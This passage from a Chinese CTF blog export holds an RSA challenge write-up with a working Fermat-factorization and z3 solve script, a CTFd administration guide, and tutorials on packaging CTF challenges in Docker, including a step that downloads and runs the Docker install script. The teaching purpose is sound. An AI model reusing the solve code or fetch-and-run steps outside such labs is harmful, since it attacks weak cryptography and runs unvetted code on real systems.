40588227045595304080360385041082238507044292731344465815296032905633525556943787610712651675460810768762763493579129831271018141591546207557410817432455139315527674932933085299277599173971912445226532235814580879585317211349524406424200622675880992390782025158621241499693400288031658194434641718026910652327933253877313106112861283314274635124734817398465059373562194694957841264834312640926278890386089611103714990646541470577351599526904458342660444968591197606820361364761648205241041444681145820799054413179462285509661124362074093583494932706249461954240408827087015525507173082129412234486228092002841868365895837463699200959915782767657258729794037776401995309244941171415842403617486719492483671490834562579225506831496881542530519595438932482796867853234159664409420977526102480385193101883785161080269573707156626838551506024455480650224305894501968583442346807126920740779780593650871645915149689424292912611578291912721896864772950410266629045542480009266574096080138709683466489568290569363478444349563498507530805502511051165160827192795520182720802422213364247355775222858214648603034743679187470844212529134374975737510982287957316878179964602394749601431823167982157434890459245394370728942790117156485268116758052636794417268680901420193002289035538753620555488506926366624641291881353268617130968991258983002165300186971963661666476600998389048880565199317280428349802824448329898502788492233381873026217202981921654673840142095839603360666049476100561268336225902504932800605464136192275593886736746497955270280541423593</span></span><br><span class="line"><span class="comment">#c2 = 25591090168544821761746024178724660839590948190451329227481168576490717242294520739865602061082558759751196452117720647426598261568572440942370039702932821941366792140173428488344932203576334292648255551171274828821657097667106792872200082579319963310503721435500623146012954474613150848083425126987554594651797477741828655238243550266972216752593788734836373144363217639612492397228808215205862281278774096317615918854403992620720969173788151215489908812749179861803144937169587452008097008940710091361183942268245271154461872102813602754439939747566507116519362821255724179093051041994730856401493996771276172343313045755916751082693149885922105491818225012844519264933137622929024918619477538521533548551789739698933067212305578480416163609137189891797209277557411169643568540392303036719952140554435338851671440952865151077383220305295001632816442144022437763089133141886924265774247290306669825085862351732336395617276100374237159580759999593028756939354840677333467281632435767033150052439262501059299035212928041546259933118564251119588970009016873855478556588250138969938599988198494567241172399453741709840486953189764289118312870580993115636710724139809708256360212728127786394411676427828431569046279687481368215137561500777480380501551616577832499521295655237360184159889151837766353116185320317774645294201044772828099074917077896631909654671612557207653830344897644115936322128351494551004652981550758791285434809816872381900401440743578104582305215488888563166054568802145921399726673752722820646807494657299104190123945675647</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="考点："><a href="#考点：" class="headerlink" title="考点："></a>考点：</h3><p>第一段</p>
<script type="math/tex; mode=display">
n\,\,=\,\,p\,\,* q\,\,* nextprime\left( p \right) \,\,* nextprime\left( q \right)</script><p>费马分解。</p>
<p>第二段解个方程（实际出了个离谱非预期，根本不用解，但是没有战队想到），然后欧拉函数。</p>
<h3 id="解法："><a href="#解法：" class="headerlink" title="解法："></a>解法：</h3><p>这垃圾出题人刷没刷过题啊，祥云杯2020的原题都好意思拿来出。</p>
<p>祥云杯脚本走一下就行。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n1 = <span class="number">6348779979606280884589422188738902470575876294643492831465947360363568026280963989291591157710389629216109615274754718329987990551836115660879103234129921943824061416396264358110216047994331119920503431491509529604742468032906950984256964560405062345280120526771439940278606226153077959057882262745273394986607004406770035459301695806378598890589432538916219821477777021460189140081521779103226953544426441823244765828342973086422949017937701261348963541035128661464068769033772390320426795044617751909787914185985911277628404632533530390761257251552073493697518547350246993679844132297414094727147161169548160586911</span></span><br><span class="line">c1 = <span class="number">6201882078995455673376327652982610102807874783073703018551044780440620679217833227711395689114659144506630609087600915116940111002026241056808189658969089532597757995423694966667948250438579639890580690392400661711864264184444018345499567505424672090632235109624193289954785503512742400960515331371813467034511130432319427185134018830006918682733848618201088649690422818940385123599468595766345668931882249779415788129316594083269412221804774856038796248038700275509397599351533280014908894068141056694660319816046357462684688942519849441237878018480036145051967731081582598773076490918572392784684372694103015244826</span></span><br><span class="line"></span><br><span class="line">jia = <span class="number">274773146761138462708137582309097386437793891793691383033856524303010811294101933454824485010521468914846151819876043508541879637544444256520741418495479393777132830985856522008561088410862815913292288683761657919121930016956916865849261153721097671315883469348972925757078089715102032241818526925988645578778</span></span><br><span class="line">cheng = <span class="number">18514724270030962172566965941723224386374076294232652258701085781018776172843355920566035157331579524980108190739141959926523082142273672741849552475156278397131571360099018592018959785627785130126477982765210498547680367230723634424036009539347854344573537848628061468892166199866227984167843139793429682559241317072979374002912607549039431398267184818771503468116379618249319324788996321340764624593443106354104274472601170229835219638093242557547840060892527576940077162990069687019966946826210112318408269749294366586682732614372434218768720577917368726530200897558912687470088583774711767599580037663378929000217</span></span><br><span class="line">n2 = <span class="number">40588227045595304080360385041082238507044292731344465815296032905633525556943787610712651675460810768762763493579129831271018141591546207557410817432455139315527674932933085299277599173971912445226532235814580879585317211349524406424200622675880992390782025158621241499693400288031658194434641718026910652327933253877313106112861283314274635124734817398465059373562194694957841264834312640926278890386089611103714990646541470577351599526904458342660444968591197606820361364761648205241041444681145820799054413179462285509661124362074093583494932706249461954240408827087015525507173082129412234486228092002841868365895837463699200959915782767657258729794037776401995309244941171415842403617486719492483671490834562579225506831496881542530519595438932482796867853234159664409420977526102480385193101883785161080269573707156626838551506024455480650224305894501968583442346807126920740779780593650871645915149689424292912611578291912721896864772950410266629045542480009266574096080138709683466489568290569363478444349563498507530805502511051165160827192795520182720802422213364247355775222858214648603034743679187470844212529134374975737510982287957316878179964602394749601431823167982157434890459245394370728942790117156485268116758052636794417268680901420193002289035538753620555488506926366624641291881353268617130968991258983002165300186971963661666476600998389048880565199317280428349802824448329898502788492233381873026217202981921654673840142095839603360666049476100561268336225902504932800605464136192275593886736746497955270280541423593</span></span><br><span class="line">c2 = <span class="number">25591090168544821761746024178724660839590948190451329227481168576490717242294520739865602061082558759751196452117720647426598261568572440942370039702932821941366792140173428488344932203576334292648255551171274828821657097667106792872200082579319963310503721435500623146012954474613150848083425126987554594651797477741828655238243550266972216752593788734836373144363217639612492397228808215205862281278774096317615918854403992620720969173788151215489908812749179861803144937169587452008097008940710091361183942268245271154461872102813602754439939747566507116519362821255724179093051041994730856401493996771276172343313045755916751082693149885922105491818225012844519264933137622929024918619477538521533548551789739698933067212305578480416163609137189891797209277557411169643568540392303036719952140554435338851671440952865151077383220305295001632816442144022437763089133141886924265774247290306669825085862351732336395617276100374237159580759999593028756939354840677333467281632435767033150052439262501059299035212928041546259933118564251119588970009016873855478556588250138969938599988198494567241172399453741709840486953189764289118312870580993115636710724139809708256360212728127786394411676427828431569046279687481368215137561500777480380501551616577832499521295655237360184159889151837766353116185320317774645294201044772828099074917077896631909654671612557207653830344897644115936322128351494551004652981550758791285434809816872381900401440743578104582305215488888563166054568802145921399726673752722820646807494657299104190123945675647</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">s=Solver()</span><br><span class="line">x=Int(<span class="string">'x'</span>)</span><br><span class="line">y=Int(<span class="string">'y'</span>)</span><br><span class="line">s.add(x+y==jia)</span><br><span class="line">s.add(x*y==cheng)</span><br><span class="line"><span class="keyword">assert</span> s.check()==sat</span><br><span class="line"></span><br><span class="line">p2=<span class="built_in">int</span>(<span class="built_in">str</span>(s.model()[x]))</span><br><span class="line">q2=<span class="built_in">int</span>(<span class="built_in">str</span>(s.model()[y]))</span><br><span class="line"></span><br><span class="line">phi = n2 * (p2-<span class="number">1</span>) * (q2-<span class="number">1</span>) // (p2 * q2)</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">d = inverse(e,phi)</span><br><span class="line">m2=long_to_bytes(<span class="built_in">pow</span>(c2,d,n2))</span><br><span class="line"><span class="built_in">print</span>(m2)</span><br><span class="line"></span><br><span class="line">phi1=p2-<span class="number">1</span></span><br><span class="line">d = inverse(e,phi1)</span><br><span class="line">m = <span class="built_in">pow</span>(c2, d, p2)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fermat_factorization</span>(<span class="params">n</span>):</span></span><br><span class="line">	factor_list = []</span><br><span class="line">	get_context().precision = <span class="number">1024</span></span><br><span class="line">	x = <span class="built_in">int</span>(sqrt(n))</span><br><span class="line">	<span class="comment">#print(x)</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		x += <span class="number">1</span></span><br><span class="line">		y2 = x ** <span class="number">2</span> - n</span><br><span class="line">		<span class="keyword">if</span> is_square(y2):</span><br><span class="line">			<span class="comment">#print('x = ',x)</span></span><br><span class="line">			y2 = mpz(y2)</span><br><span class="line">			get_context().precision = <span class="number">1024</span></span><br><span class="line">			y = <span class="built_in">int</span>(sqrt(y2))</span><br><span class="line">			factor_list.append([x+y, x-y])</span><br><span class="line">		<span class="keyword">if</span> <span class="built_in">len</span>(factor_list) == <span class="number">2</span>:</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">return</span> factor_list</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">* 复制并使用代码请注明引用出处哦~</span><br><span class="line">* Lazzaro @ https://lazzzaro.github.io</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">tmp1=(fermat_factorization(n1)[<span class="number">0</span>])[<span class="number">0</span>]</span><br><span class="line">tmp2=(fermat_factorization(n1)[<span class="number">0</span>])[<span class="number">1</span>]</span><br><span class="line">tmp3=(fermat_factorization(n1)[<span class="number">1</span>])[<span class="number">0</span>]    <span class="comment">#p1*q1</span></span><br><span class="line">tmp4=(fermat_factorization(n1)[<span class="number">1</span>])[<span class="number">1</span>]    <span class="comment">#p*q</span></span><br><span class="line"></span><br><span class="line">p=gcd(tmp1,tmp4)</span><br><span class="line">q=gcd(tmp2,tmp4)</span><br><span class="line">p1=next_prime(p)</span><br><span class="line">q1=next_prime(q)</span><br><span class="line">phi1=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)*(p1-<span class="number">1</span>)*(q1-<span class="number">1</span>)</span><br><span class="line">d1=inverse(<span class="number">65537</span>,phi1)</span><br><span class="line">m1=long_to_bytes(<span class="built_in">pow</span>(c1,d1,n1))</span><br><span class="line"><span class="built_in">print</span>(m1)</span><br><span class="line"><span class="built_in">print</span>(m1+m2)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>解方程有很多种解法，z3，sagemath，求根公式，当然也可以不解方程。</p>
<script type="math/tex; mode=display">
n\,\,=\,\,p^2\,\,*\,q^3
\\
p*q\,\,=\,\,c
\\
q\,\,=\,\,n\,\,\div \,\,\left( p^2q^2 \right)</script><p>看得出来出题人确实没学好除法。</p>
<p>费马分解后，4个值为<code>p*q</code>、<code>p1*q</code>、<code>p*q1</code>、<code>p1*q1</code>，显然，4个数最大的为<code>p1*q1</code>，最小的为<code>p*q</code>，那和剩下的两个数求个公因数就出来了。</p>
<p>欧拉函数不多解释了，放两个。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">phi = p-<span class="number">1</span></span><br><span class="line">d = inverse(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,p)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">phi = (p-<span class="number">1</span>) * p * (q-<span class="number">1</span>) * q * q</span><br><span class="line">d = inverse(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br></pre></td></tr></table></figure>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>建议出题人好好学习数学，不要不自量力去给全国性的比赛出题。</p>
]]></content>
      <categories>
        <category>crypto</category>
      </categories>
      <tags>
        <tag>比赛复现</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFd运维指南</title>
    <url>/2021/10/05/CTFd%E8%BF%90%E7%BB%B4%E6%8C%87%E5%8D%97/</url>
    <content><![CDATA[<h1 id="如何运维CTFd"><a href="#如何运维CTFd" class="headerlink" title="如何运维CTFd"></a>如何运维CTFd</h1><p>简单的总结并分享一下CTFd 3.4.0版本的运维。</p>
<span id="more"></span>
<p><img src="https://c.img.dasctf.com/images/20221220/1671531837275-62c99763-9c14-4eca-b920-2248c0e92423.png" alt="image-20211005134919356"></p>
<p>进入管理员页面，大概是这样一个总览图。接下来我会介绍一下每个模块的功能。</p>
<h2 id="Statistics"><a href="#Statistics" class="headerlink" title="Statistics"></a>Statistics</h2><p>一个统计页面，过。</p>
<h2 id="Notifications"><a href="#Notifications" class="headerlink" title="Notifications"></a>Notifications</h2><p>通知页面，没玩过，无非就是发些通知、公告类，影响不大，过。</p>
<h2 id="Pages"><a href="#Pages" class="headerlink" title="Pages"></a>Pages</h2><p>页面功能，就是给网站加页面，自定义路由和路由名字。</p>
<p><img src="https://c.img.dasctf.com/images/20221220/1671531845418-08d11b0a-5fb0-4e93-9be0-b3ec5c2af60f.png" alt="image-20211005135405456"></p>
<p>没什么花里胡哨的，都是字面意思。Authentication Required选项是需要登录后才可查看的意思。</p>
<h2 id="Users"><a href="#Users" class="headerlink" title="Users"></a>Users</h2><p><img src="https://c.img.dasctf.com/images/20221220/1671531851919-7caee9f9-00b0-42a6-9ab8-957d54f30e3b.png" alt="image-20211005135756947"></p>
<p>都看得懂的吧，编辑权限、状态、修改信息等功能。注意，管理员账号权限非常高，可以任意修改他人（包括其他管理员的权限），也可以自己把自己号删了，使用时建议管理员越少越好。</p>
<p>还可以看到每个人的正确、错误提交，未解题、登录IP地址（较准确）、个人统计等数据。</p>
<h2 id="Scoreboard"><a href="#Scoreboard" class="headerlink" title="Scoreboard"></a>Scoreboard</h2><p>积分榜，没什么好多说的。</p>
<h2 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h2><p>挑战模块，最常用的模块，只讲解dynamic_docker部分。ICPC的ACM插件自行探索吧。</p>
<p>首先是categories分类，也就是体现在主页上的内容。pages主题会自动识别这个框里的<code>.</code>符号，实现二级标题。</p>
<p>然后是docker image，写你上传在docker上的镜像，就是docker pull后面的内容。</p>
<p>Frp Redirect Type，有域名会配置解析写HTTP，不会老老实实用direct。</p>
<p>Frp Redirect Port，你dockerfile里暴露的哪个端口，就写映射哪个端口。</p>
<p>下面两个不要动。静态分数和动态分数。</p>
<p>动态分数的曲线公式写出来估计你们也看不懂，所以我写了个实现函数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Cal</span>(<span class="params">max_point,min_point,solve_threshold,x</span>):</span></span><br><span class="line">	a = max_point</span><br><span class="line">	b = min_point</span><br><span class="line">	s = solve_threshold</span><br><span class="line">	<span class="keyword">if</span> x&gt;=s:</span><br><span class="line">		<span class="keyword">return</span> b</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		results = ((b-a)*x*x)/(s*s)+a </span><br><span class="line">		<span class="keyword">return</span> results</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">10</span>):</span><br><span class="line">	<span class="built_in">print</span>(Cal(<span class="number">100</span>,<span class="number">20</span>,<span class="number">5</span>,i))</span><br><span class="line">    </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">100.0</span></span><br><span class="line"><span class="string">96.8</span></span><br><span class="line"><span class="string">87.2</span></span><br><span class="line"><span class="string">71.2</span></span><br><span class="line"><span class="string">48.8</span></span><br><span class="line"><span class="string">20.0</span></span><br><span class="line"><span class="string">20</span></span><br><span class="line"><span class="string">20</span></span><br><span class="line"><span class="string">20</span></span><br><span class="line"><span class="string">20</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>需要4个参数，最高分、最低分、一个固定常数s、解题人数x</p>
<p>程序很简单，都能看懂，不解释。</p>
<h2 id="Submissions"><a href="#Submissions" class="headerlink" title="Submissions"></a>Submissions</h2><p>记录了所有人所有题目的正确提交和错误提交。</p>
<h2 id="config"><a href="#config" class="headerlink" title="config"></a>config</h2><p>这个是个人能用翻译的都看得懂了，基础设置。</p>
<p>security是邀请码，写了以后，注册要填邀请码。</p>
<p>backup备份，建议定期备份站的数据。也可以导入数据，做平台迁移。注意导入后要坚持whale和一些其他设置的信息。每个平台都有自己的架构。</p>
<h2 id="whale"><a href="#whale" class="headerlink" title="whale"></a>whale</h2><p>ctfd的动态靶机插件，Direct IP Address不懂的写自己真实ip，这个没法教，自己搭一遍平台就懂了。否则说也说不清楚。</p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>开发、导入插件等自定义功能请自行探索。</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://github.com/frankli0324/ctfd-whale">CTF3.0版本CTFd-whale</a></p>
<p><a href="https://github.com/frankli0324/ctfd-pages-theme">pages主题</a></p>
<p><a href="https://www.zhaoj.in/read-6333.html">赵总官方教程</a></p>
<p>搭建可以参考我的博客（旧版2.3.2），以及vaalacat和frankli0324的教程（新版）</p>
<h2 id="寄语"><a href="#寄语" class="headerlink" title="寄语"></a>寄语</h2><p>当我写下这篇文档时，恐怕我不会再对这个我早8晚1肝了2个月的平台做进一步维护了。希望它能成为结合课堂教学、日常练习、训练赛等各项功能于一体的综合性训练平台。同时，我的个人dockerhub仓库很有可能不再更新，也不再会代表Rainbow7战队参加比赛。不过，这并不意味着我的网安之路的结束，我认为这更像是一场全新的开始。我依然有可能参与一些线上比赛，也有可能和其他志同道合的朋友一起去玩玩更多的东西。只是对我来说，CTF将不再是我的全部。</p>
<p>留下一点期待。</p>
<p>希望后辈有人能设计出n机frp转发模式，这样可以大幅降低平台压力。1核2G配置极限应该只够20人同时使用。虽然根据概率论的原理来计算，35个活跃用户同时开启10台及以上的靶机的概率≈0.0004，但是，这样的训练平台肯定无法满足比赛需求。</p>
<p>以及开发<code>v1/api</code>插件，只使用<code>go-cqhttp</code>即可做出ctfshow和大牛的播报效果。</p>
<p>根据<code>onebot</code>机器人协议，可以开发出更多带有意思的功能的qqbot，推荐使用nonebot2 。</p>
<p>还有内网穿透，公网访问内网服务器地址，尤其适用于博客。</p>
]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>CTFd运维</tag>
      </tags>
  </entry>
  <entry>
    <title>如何用docker出一道ctf题(crypto)</title>
    <url>/2021/09/30/%E5%A6%82%E4%BD%95%E7%94%A8docker%E5%87%BA%E4%B8%80%E9%81%93ctf%E9%A2%98-crypto/</url>
    <content><![CDATA[<h1 id="如何用docker出一道ctf题-crypto"><a href="#如何用docker出一道ctf题-crypto" class="headerlink" title="如何用docker出一道ctf题(crypto)"></a>如何用docker出一道ctf题(crypto)</h1><p>目前docker的使用越来越宽泛，ctfd也支持从dockerhub一键拉题了。因此，学习如何使用docker出ctf题是非常必要的。</p>
<span id="more"></span>
<h2 id="python3篇"><a href="#python3篇" class="headerlink" title="python3篇"></a>python3篇</h2><p>在介绍python2篇和python3篇之前，首先需要对raw_input和input这两个函数做一个讲解。引用<a href="https://www.runoob.com/python/python-func-raw_input.html">菜鸟教程</a>。</p>
<blockquote>
<p>注意：input() 和 raw_input() 这两个函数均能接收 字符串 ，但 raw_input()  直接读取控制台的输入（任何类型的输入它都可以接收）。而对于 input() ，它希望能够读取一个合法的 python  表达式，即你输入字符串的时候必须使用引号将它括起来，否则它会引发一个 SyntaxError 。</p>
<p>除非对 input() 有特别需要，否则一般情况下我们都是推荐使用 raw_input() 来与用户交互。</p>
<p>注意：python3 里 input() 默认接收到的是 str 类型。</p>
</blockquote>
<p>因此，在python3环境下出题，输入端要填input()。</p>
<p>和web篇一样，我们以一道完整的题来演示一下。题目为sha256碰撞。</p>
<h3 id="sha256-py"><a href="#sha256-py" class="headerlink" title="sha256.py"></a>sha256.py</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">BUFSIZE = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">c0</span>():</span></span><br><span class="line">    random.seed(os.urandom(<span class="number">128</span>))</span><br><span class="line">    alphabet = string.ascii_letters+string.digits</span><br><span class="line">    proof = <span class="string">&#x27;&#x27;</span>.join(random.choices(alphabet, k=<span class="number">16</span>))</span><br><span class="line">    hash_value = hashlib.sha256(proof.encode(<span class="string">&#x27;ascii&#x27;</span>)).hexdigest()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;???&#x27;</span>+<span class="string">&#x27;+&#x27;</span>+proof[<span class="number">3</span>:])</span><br><span class="line">    <span class="built_in">print</span>(hash_value)</span><br><span class="line">    buf = <span class="built_in">input</span>(BUFSIZE).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    tmp = buf+proof[<span class="number">3</span>:]</span><br><span class="line">    <span class="keyword">if</span> hashlib.sha256(tmp.encode(<span class="string">&#x27;ascii&#x27;</span>)).hexdigest() == hash_value:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;proof completed\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;bye~&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">win</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(os.environ.get(<span class="string">&#x27;FLAG&#x27;</span>, <span class="string">&#x27;Flag not Found...&#x27;</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        c0 = c0()</span><br><span class="line">        <span class="keyword">if</span> c0 == <span class="number">1</span>:</span><br><span class="line">            win()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<p>先是一波经典偷懒，直接拿了<code>ctftraining</code>的<code>copperstudy2.py</code>进行修改，改除了这道题目。由于答案在环境变量里，可以采用<code>print(os.environ.get(&#39;FLAG&#39;))</code>这种方法，但是我个人更喜欢<code>from flag import flag</code>这种方法，区别不大，主要就是知道如何从系统环境变量中拿flag就行。</p>
<p>然后看Dockerfile，更简单。</p>
<h3 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h3><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ctfhub/base_misc_socat_python_36</span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> sha256.py /app/sha256.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">MAINTAINER</span> mapleice &lt;https://liuxin2020.github.io&gt;</span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="bash"> socat TCP4-LISTEN:10000,tcpwrap=script,reuseaddr,fork EXEC:<span class="string">&quot;/usr/bin/env python3 -u /app/sha256.py&quot;</span></span></span><br></pre></td></tr></table></figure>
<p>做成镜像传上去就行了。</p>
<p>其他记得注意填写<code>requirements.txt</code></p>
<h2 id="python2"><a href="#python2" class="headerlink" title="python2"></a>python2</h2><p>有空回来更。注意使用<code>raw_input</code></p>
]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>ctf出题指南</tag>
      </tags>
  </entry>
  <entry>
    <title>如何用docker出一道ctf题(web)</title>
    <url>/2021/09/28/%E5%A6%82%E4%BD%95%E7%94%A8docker%E5%87%BA%E4%B8%80%E9%81%93ctf%E9%A2%98(web)/</url>
    <content><![CDATA[<h1 id="如何用docker出一道ctf题-web"><a href="#如何用docker出一道ctf题-web" class="headerlink" title="如何用docker出一道ctf题(web)"></a>如何用docker出一道ctf题(web)</h1><p>目前docker的使用越来越宽泛，ctfd也支持从dockerhub一键拉题了。因此，学习如何使用docker出ctf题是非常必要的。</p>
<span id="more"></span>
<h2 id="安装docker和docker-compose"><a href="#安装docker和docker-compose" class="headerlink" title="安装docker和docker-compose"></a>安装docker和docker-compose</h2><p>100种方法，写个最简单的。之前一篇文章CTFD部署里我也提到过如何安装。</p>
<h3 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -fsSL https://get.docker.com -o get-docker.sh</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sh get-docker.sh --mirror Aliyun</span><br></pre></td></tr></table></figure>
<h3 id="安装docker-compose"><a href="#安装docker-compose" class="headerlink" title="安装docker-compose"></a>安装docker-compose</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install python3-pip -y</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip3 install docker-compose</span><br></pre></td></tr></table></figure>
<h2 id="无数据库篇"><a href="#无数据库篇" class="headerlink" title="无数据库篇"></a>无数据库篇</h2><p>这个比较简单，先挂一下tree。</p>
<p><img src="https://c.img.dasctf.com/images/20221220/1671531790278-9432efb1-7096-4e3c-bc42-f50d77e121ee.png" alt="image-20210928171223267"></p>
<p>我本人习惯在windows下出题，主要是因为方便。<del>实际上是因为我虚拟机里一堆bug</del>。</p>
<p>接下来我们一层一层解析。</p>
<h3 id="flag-php"><a href="#flag-php" class="headerlink" title="flag.php"></a>flag.php</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;flag&#123;1234&#125;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>先从最底层<code>html</code>文件夹内的内容说起。这里面就放题目和<code>flag.php</code>即可，flag如果在根目录的情况我会另外标注(在flag.sh中改)。</p>
<h3 id="flag-sh"><a href="#flag-sh" class="headerlink" title="flag.sh"></a>flag.sh</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">sed -i <span class="string">&quot;s/flag&#123;1234&#125;/<span class="variable">$FLAG</span>/&quot;</span> /var/www/html/flag.php</span><br><span class="line"><span class="built_in">export</span> FLAG=not_flag</span><br><span class="line">FLAG=not_flag</span><br><span class="line"></span><br><span class="line">rm -f /flag.sh</span><br></pre></td></tr></table></figure>
<p>ctfd-whale会自动生成一个随机flag的变量在$FLAG里。</p>
<p>第二行就是将你存储flag的位置，做个替换，3,4行清空环境变量值，否则执行<code>echo $FLAG</code>就能直接出flag。</p>
<p>如果要把flag放入根目录/flag，把第二行改成：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="variable">$FLAG</span> &gt;&gt; /flag</span><br></pre></td></tr></table></figure>
<h3 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h3><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 请务必保证该出能从 hub.docker.com 上拉取下来。</span></span><br><span class="line"><span class="comment"># 尽量使用能在 hub.docker.com 上查看到 Dockerfile，下载量高的官方认证镜像，推荐使用 https://github.com/DASCTF.</span></span><br><span class="line"><span class="keyword">FROM</span> ctftraining/base_image_nginx_php_73</span><br><span class="line"></span><br><span class="line"><span class="comment"># 拷贝源码到相应目录下。</span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> src /var/www</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如需自定义 FLAG 请将自定义脚本覆盖到 /flag.sh</span></span><br><span class="line"><span class="comment"># COPY files/flag.sh /flag.sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如需操作数据库请将 sql 文件拷贝到 /db.sql</span></span><br><span class="line"><span class="comment"># COPY files/db.sql /db.sql</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如有上传文件等操作请务必将权限设置正确！</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> chown -R www-data:www-data /var/www/html/ &amp;&amp; \</span></span><br><span class="line"><span class="bash">    mv /var/www/flag.sh / &amp;&amp; \</span></span><br><span class="line"><span class="bash">    chmod +x /flag.sh &amp;&amp; \</span></span><br><span class="line"><span class="bash">    dos2unix /flag.sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如需静态 FLAG 请在此利用环境变量声明</span></span><br><span class="line"><span class="comment"># ENV DASFLAG=DASCTF&#123;flag_test&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 请声明对外暴露端口</span></span><br><span class="line"><span class="comment"># EXPOSE 80</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>直接用集成镜像了，太猛了。这个镜像不需要暴露端口。DASCTF的镜像需要暴露端口。相关源码可以去github上搜ctftraining去看。</p>
